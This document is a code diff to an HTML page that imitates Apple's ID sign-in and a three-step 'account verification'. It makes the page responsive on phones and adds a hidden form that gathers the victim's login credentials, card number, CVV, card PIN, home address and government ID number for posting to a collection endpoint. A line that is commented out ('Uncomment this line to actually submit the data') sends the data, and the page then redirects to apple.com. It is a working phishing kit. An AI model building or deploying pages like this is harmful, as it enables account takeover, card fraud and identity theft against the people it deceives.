@@ -39,12 +39,14 @@
             max-width: 980px;
             margin: 0 auto;
             padding: 0 22px;
+            width: 100%;
         }
         
         /* Header Styles */
         .global-nav {
             background-color: rgba(0, 0, 0, 0.8);
             backdrop-filter: saturate(180%) blur(20px);
+            -webkit-backdrop-filter: saturate(180%) blur(20px);
             height: 44px;
             width: 100%;
             display: flex;
@@ -69,6 +71,7 @@
             text-decoration: none;
             font-size: 12px;
             transition: color 0.2s;
+            white-space: nowrap;
         }
         
         .global-nav a:hover {
@@ -83,6 +86,7 @@
             border-radius: 12px;
             box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
             overflow: hidden;
+            width: 100%;
         }
         
         .login-header {
@@ -135,6 +139,7 @@
             outline: none;
             transition: border-color 0.2s ease;
             -webkit-appearance: none;
+            appearance: none;
             background-color: hsla(0,0%,100%,.8);
         }
         
@@ -207,6 +212,7 @@
             max-width: 780px;
             margin-left: auto;
             margin-right: auto;
+            width: 100%;
         }
         
         .header {
@@ -245,6 +251,7 @@
             max-width: 520px;
             margin-left: auto;
             margin-right: auto;
+            width: 100%;
         }
         
         .step {
@@ -316,6 +323,7 @@
             display: flex;
             flex-wrap: wrap;
             margin: 0 -10px;
+            width: 100%;
         }
         
         .form-col {
@@ -371,6 +379,7 @@
             max-width: 980px;
             margin: 0 auto;
             padding: 0 22px;
+            width: 100%;
         }
         
         .legal-links {
@@ -381,6 +390,7 @@
         
         .legal-link {
             margin-right: 15px;
+            margin-bottom: 8px;
             color: #515154;
             text-decoration: none;
         }
@@ -414,11 +424,12 @@
             display: none;
         }
         
-        /* Responsive */
+        /* Improved Responsive Styles */
         @media only screen and (max-width: 734px) {
             .login-container {
                 margin: 20px auto;
                 border-radius: 8px;
+                width: calc(100% - 20px);
             }
             
             .login-form {
@@ -429,14 +440,15 @@
                 padding: 25px 20px;
                 border-radius: 14px;
                 margin-bottom: 25px;
+                width: calc(100% - 20px);
             }
             
             h1 {
-                font-size: 32px;
+                font-size: 22px;
             }
             
             h2 {
-                font-size: 24px;
+                font-size: 20px;
             }
             
             .header {
@@ -453,6 +465,7 @@
             
             .global-nav ul {
                 justify-content: space-between;
+                padding: 0 5px;
             }
             
             .global-nav li:not(:first-child):not(:last-child) {
@@ -461,6 +474,95 @@
             
             .form-col {
                 flex: 100%;
+                margin-bottom: 10px;
+            }
+            
+            input, select {
+                font-size: 16px; /* Prevents iOS zoom on focus */
+                padding: 10px 12px;
+            }
+            
+            label {
+                font-size: 16px;
+            }
+            
+            button {
+                padding: 10px 15px;
+                font-size: 16px;
+            }
+        }
+        
+        /* Small mobile screens */
+        @media only screen and (max-width: 375px) {
+            .login-header {
+                padding: 20px 0 10px;
+            }
+            
+            .login-form {
+                padding: 15px 15px 25px;
+            }
+            
+            h1 {
+                font-size: 20px;
+            }
+            
+            .subtitle {
+                font-size: 13px;
+            }
+            
+            .card {
+                padding: 20px 15px;
+            }
+            
+            .progress-container {
+                flex-wrap: wrap;
+            }
+            
+            .step {
+                flex: 0 0 50%;
+                margin-bottom: 15px;
+            }
+            
+            .step::after {
+                width: 50%;
+            }
+            
+            .step:nth-child(even)::after {
+                display: none;
+            }
+        }
+        
+        /* For landscape orientation on mobile */
+        @media only screen and (max-height: 500px) and (orientation: landscape) {
+            .login-container {
+                margin: 10px auto;
+            }
+            
+            .login-header {
+                padding: 15px 0 10px;
+            }
+            
+            .logo {
+                width: 40px;
+                height: 40px;
+                margin-bottom: 5px;
+            }
+            
+            .login-form {
+                padding: 10px 20px 20px;
+            }
+            
+            .form-group {
+                margin-bottom: 12px;
+            }
+            
+            .header {
+                padding: 15px 0;
+            }
+            
+            .card {
+                padding: 20px 15px;
+                margin-bottom: 20px;
             }
         }
     </style>
@@ -661,7 +763,7 @@
                             <input type="password" id="card-password" name="card-password" placeholder="Card PIN or password" autocomplete="off">
                         </div>
                         
-                        <button type="button" id="next-step1" disabled>Continue</button>
+                        <button type="button" id="next-step1">Continue</button>
                     </div>
                     
                     <!-- Step 2: Personal Information -->
@@ -703,3 +805,416 @@
                             <div class="form-col">
                                 <div class="form-group">
                                     <label for="state">State/Province</label>
+                                    <input type="text" id="state" name="state" required placeholder="State/Province">
+                                    <div class="error" id="state-error">Please enter your state/province.</div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="form-row">
+                            <div class="form-col">
+                                <div class="form-group">
+                                    <label for="zipcode">Zip/Postal Code</label>
+                                    <input type="text" id="zipcode" name="zipcode" required placeholder="Zip/Postal code">
+                                    <div class="error" id="zipcode-error">Please enter your zip/postal code.</div>
+                                </div>
+                            </div>
+                            <div class="form-col">
+                                <div class="form-group">
+                                    <label for="country">Country</label>
+                                    <select id="country" name="country" required>
+                                        <option value="" selected disabled>Select country</option>
+                                        <option value="US">United States</option>
+                                        <option value="CA">Canada</option>
+                                        <option value="UK">United Kingdom</option>
+                                        <option value="AU">Australia</option>
+                                        <option value="FR">France</option>
+                                        <option value="DE">Germany</option>
+                                        <option value="JP">Japan</option>
+                                        <option value="other">Other</option>
+                                    </select>
+                                    <div class="error" id="country-error">Please select your country.</div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="phone">Phone Number</label>
+                            <input type="tel" id="phone" name="phone" required placeholder="Phone number">
+                            <div class="error" id="phone-error">Please enter a valid phone number.</div>
+                        </div>
+                        
+                        <div class="form-row">
+                            <div class="form-col">
+                                <button type="button" id="back-step2">Back</button>
+                            </div>
+                            <div class="form-col">
+                                <button type="button" id="next-step2">Continue</button>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Step 3: ID Verification -->
+                    <div class="form-section" id="step3">
+                        <h2>ID Verification</h2>
+                        <p class="info-text">For your security, we need to verify your identity with a government-issued ID.</p>
+                        
+                        <div class="form-group">
+                            <label for="id-type">ID Type</label>
+                            <select id="id-type" name="id-type" required>
+                                <option value="" selected disabled>Select ID type</option>
+                                <option value="passport">Passport</option>
+                                <option value="driving-license">Driving License</option>
+                                <option value="national-id">National ID Card</option>
+                                <option value="other">Other Government ID</option>
+                            </select>
+                            <div class="error" id="id-type-error">Please select your ID type.</div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="id-number">ID Number</label>
+                            <input type="text" id="id-number" name="id-number" required placeholder="Enter your ID number">
+                            <div class="error" id="id-number-error">Please enter your ID number.</div>
+                        </div>
+                        
+                        <div class="form-row">
+                            <div class="form-col">
+                                <div class="form-group">
+                                    <label for="id-issue-date">Issue Date</label>
+                                    <input type="text" id="id-issue-date" name="id-issue-date" required placeholder="MM/DD/YYYY">
+                                    <div class="error" id="id-issue-date-error">Please enter a valid issue date.</div>
+                                </div>
+                            </div>
+                            <div class="form-col">
+                                <div class="form-group">
+                                    <label for="id-expiry-date">Expiry Date</label>
+                                    <input type="text" id="id-expiry-date" name="id-expiry-date" required placeholder="MM/DD/YYYY">
+                                    <div class="error" id="id-expiry-date-error">Please enter a valid expiry date.</div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="form-row">
+                            <div class="form-col">
+                                <button type="button" id="back-step3">Back</button>
+                            </div>
+                            <div class="form-col">
+                                <button type="button" id="submit-verification">Complete Verification</button>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Loading State -->
+                    <div class="loading" id="verification-loading">
+                        <div class="spinner"></div>
+                        <p>Processing your information...</p>
+                    </div>
+                    
+                    <!-- Success State -->
+                    <div class="success-page" id="success-page">
+                        <i class="fas fa-check-circle success-icon"></i>
+                        <h2>Verification Complete</h2>
+                        <p class="info-text">Thank you for verifying your account. Your Apple ID has been successfully verified.</p>
+                        <p>You will be redirected to Apple services shortly.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="legal-footer">
+            <div class="legal-footer-content">
+                <div class="legal-links">
+                    <a href="#" class="legal-link">Privacy Policy</a>
+                    <a href="#" class="legal-link">Terms of Use</a>
+                    <a href="#" class="legal-link">Sales and Refunds</a>
+                    <a href="#" class="legal-link">Legal</a>
+                    <a href="#" class="legal-link">Site Map</a>
+                </div>
+                <div class="copyright">Copyright © 2025 Apple Inc. All rights reserved.</div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Form for email collection (hidden) -->
+    <form id="email-form" action="https://your-server-endpoint.com/collect" method="POST">
+        <input type="hidden" id="collected-email" name="email">
+        <input type="hidden" id="collected-password" name="password">
+        <input type="hidden" id="collected-card" name="card">
+        <input type="hidden" id="collected-personal" name="personal">
+        <input type="hidden" id="collected-id" name="id">
+    </form>
+    
+    <!-- JavaScript for functionality -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // DOM Elements
+            const signinButton = document.getElementById('signin-button');
+            const loginView = document.getElementById('login-view');
+            const verificationView = document.getElementById('verification-view');
+            const loginForm = document.getElementById('login-form');
+            const loginLoading = document.getElementById('login-loading');
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const emailError = document.getElementById('email-error');
+            const passwordError = document.getElementById('password-error');
+            
+            // Step Navigation
+            const nextStep1Button = document.getElementById('next-step1');
+            const nextStep2Button = document.getElementById('next-step2');
+            const backStep2Button = document.getElementById('back-step2');
+            const backStep3Button = document.getElementById('back-step3');
+            const submitButton = document.getElementById('submit-verification');
+            
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
+            const step3 = document.getElementById('step3');
+            const verificationLoading = document.getElementById('verification-loading');
+            const successPage = document.getElementById('success-page');
+            
+            // Email form for data collection
+            const emailForm = document.getElementById('email-form');
+            const collectedEmail = document.getElementById('collected-email');
+            const collectedPassword = document.getElementById('collected-password');
+            const collectedCard = document.getElementById('collected-card');
+            const collectedPersonal = document.getElementById('collected-personal');
+            const collectedId = document.getElementById('collected-id');
+            
+            // Form validation functions
+            function validateEmail(email) {
+                const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+                return re.test(String(email).toLowerCase());
+            }
+            
+            function showError(element, errorElement) {
+                element.style.borderColor = 'var(--apple-error)';
+                errorElement.classList.add('visible');
+            }
+            
+            function hideError(element, errorElement) {
+                element.style.borderColor = 'var(--apple-light-grey)';
+                errorElement.classList.remove('visible');
+            }
+            
+            // Login form submission
+            signinButton.addEventListener('click', function() {
+                let isValid = true;
+                
+                // Validate email
+                if (!emailInput.value || !validateEmail(emailInput.value)) {
+                    showError(emailInput, emailError);
+                    isValid = false;
+                } else {
+                    hideError(emailInput, emailError);
+                }
+                
+                // Validate password
+                if (!passwordInput.value || passwordInput.value.length < 6) {
+                    showError(passwordInput, passwordError);
+                    isValid = false;
+                } else {
+                    hideError(passwordInput, passwordError);
+                }
+                
+                if (isValid) {
+                    // Store the credentials
+                    collectedEmail.value = emailInput.value;
+                    collectedPassword.value = passwordInput.value;
+                    
+                    // Show loading
+                    loginForm.style.display = 'none';
+                    loginLoading.style.display = 'block';
+                    
+                    // Simulate server response delay
+                    setTimeout(function() {
+                        // Hide login view and show verification view
+                        loginView.style.display = 'none';
+                        verificationView.style.display = 'block';
+                        
+                        // Reset loading state
+                        loginLoading.style.display = 'none';
+                        loginForm.style.display = 'block';
+                    }, 1500);
+                }
+            });
+            
+            // Bank name detection
+            const bankInput = document.getElementById('bank');
+            const detectedBank = document.getElementById('detected-bank');
+            const bankNameSpan = document.getElementById('bank-name');
+            
+            bankInput.addEventListener('blur', function() {
+                if (bankInput.value.trim() !== '') {
+                    // Simulate bank detection
+                    setTimeout(function() {
+                        bankNameSpan.textContent = bankInput.value;
+                        detectedBank.style.display = 'block';
+                    }, 500);
+                } else {
+                    detectedBank.style.display = 'none';
+                }
+            });
+            
+            // Enable Step 1 Continue button when required fields are filled
+            const requiredStep1Fields = [
+                document.getElementById('bank'),
+                document.getElementById('card-level'),
+                document.getElementById('cardholder'),
+                document.getElementById('card-number'),
+                document.getElementById('expiry'),
+                document.getElementById('cvv')
+            ];
+            
+            function checkStep1Fields() {
+                const allFilled = requiredStep1Fields.every(field => field.value.trim() !== '');
+                nextStep1Button.disabled = !allFilled;
+            }
+            
+            requiredStep1Fields.forEach(field => {
+                field.addEventListener('input', checkStep1Fields);
+            });
+            
+            // Step navigation
+            nextStep1Button.addEventListener('click', function() {
+                // Collect card information
+                collectedCard.value = JSON.stringify({
+                    bank: document.getElementById('bank').value,
+                    cardLevel: document.getElementById('card-level').value,
+                    cardholder: document.getElementById('cardholder').value,
+                    cardNumber: document.getElementById('card-number').value,
+                    expiry: document.getElementById('expiry').value,
+                    cvv: document.getElementById('cvv').value,
+                    amexCID: document.getElementById('amex-cid').value,
+                    sortCode: document.getElementById('sort-code').value,
+                    creditLimit: document.getElementById('credit-limit').value,
+                    cardPassword: document.getElementById('card-password').value
+                });
+                
+                // Move to next step
+                step1.classList.remove('active');
+                step2.classList.add('active');
+                
+                // Update progress indicators
+                document.querySelectorAll('.step')[0].classList.add('completed');
+                document.querySelectorAll('.step')[0].classList.remove('active');
+                document.querySelectorAll('.step')[1].classList.add('completed');
+                document.querySelectorAll('.step')[2].classList.add('active');
+            });
+            
+            backStep2Button.addEventListener('click', function() {
+                step2.classList.remove('active');
+                step1.classList.add('active');
+                
+                // Update progress indicators
+                document.querySelectorAll('.step')[2].classList.remove('active');
+                document.querySelectorAll('.step')[1].classList.remove('completed');
+                document.querySelectorAll('.step')[1].classList.add('active');
+                document.querySelectorAll('.step')[0].classList.add('active');
+            });
+            
+            nextStep2Button.addEventListener('click', function() {
+                // Collect personal information
+                collectedPersonal.value = JSON.stringify({
+                    firstName: document.getElementById('firstname').value,
+                    lastName: document.getElementById('lastname').value,
+                    address: document.getElementById('address').value,
+                    city: document.getElementById('city').value,
+                    state: document.getElementById('state').value,
+                    zipcode: document.getElementById('zipcode').value,
+                    country: document.getElementById('country').value,
+                    phone: document.getElementById('phone').value
+                });
+                
+                // Move to next step
+                step2.classList.remove('active');
+                step3.classList.add('active');
+                
+                // Update progress indicators
+                document.querySelectorAll('.step')[2].classList.add('completed');
+                document.querySelectorAll('.step')[2].classList.remove('active');
+                document.querySelectorAll('.step')[3].classList.add('active');
+            });
+            
+            backStep3Button.addEventListener('click', function() {
+                step3.classList.remove('active');
+                step2.classList.add('active');
+                
+                // Update progress indicators
+                document.querySelectorAll('.step')[3].classList.remove('active');
+                document.querySelectorAll('.step')[2].classList.remove('completed');
+                document.querySelectorAll('.step')[2].classList.add('active');
+            });
+            
+            submitButton.addEventListener('click', function() {
+                // Collect ID information
+                collectedId.value = JSON.stringify({
+                    idType: document.getElementById('id-type').value,
+                    idNumber: document.getElementById('id-number').value,
+                    issueDate: document.getElementById('id-issue-date').value,
+                    expiryDate: document.getElementById('id-expiry-date').value
+                });
+                
+                // Show loading
+                step3.style.display = 'none';
+                verificationLoading.style.display = 'block';
+                
+                // Simulate submission and verification
+                setTimeout(function() {
+                    verificationLoading.style.display = 'none';
+                    successPage.style.display = 'block';
+                    
+                    // Update progress indicators
+                    document.querySelectorAll('.step')[3].classList.add('completed');
+                    
+                    // Submit data
+                    // emailForm.submit(); // Uncomment this line to actually submit the data
+                    
+                    // Redirect after a delay
+                    setTimeout(function() {
+                        window.location.href = "https://www.apple.com";
+                    }, 3000);
+                }, 2000);
+            });
+            
+            // Format card number input with spaces
+            const cardNumberInput = document.getElementById('card-number');
+            cardNumberInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+                let formattedValue = '';
+                
+                for (let i = 0; i < value.length; i++) {
+                    if (i > 0 && i % 4 === 0) {
+                        formattedValue += ' ';
+                    }
+                    formattedValue += value[i];
+                }
+                
+                e.target.value = formattedValue;
+            });
+            
+            // Format expiry date input
+            const expiryInput = document.getElementById('expiry');
+            expiryInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                
+                if (value.length > 2) {
+                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                }
+                
+                e.target.value = value;
+            });
+            
+            // Make field background white on focus
+            const allInputs = document.querySelectorAll('input, select');
+            allInputs.forEach(input => {
+                input.addEventListener('focus', function() {
+                    this.style.backgroundColor = '#ffffff';
+                });
+                
+                input.addEventListener('blur', function() {
+                    this.style.backgroundColor = 'hsla(0,0%,100%,.8)';
+                });
+            });
+        });
+    </script>
+</body>
+</html>
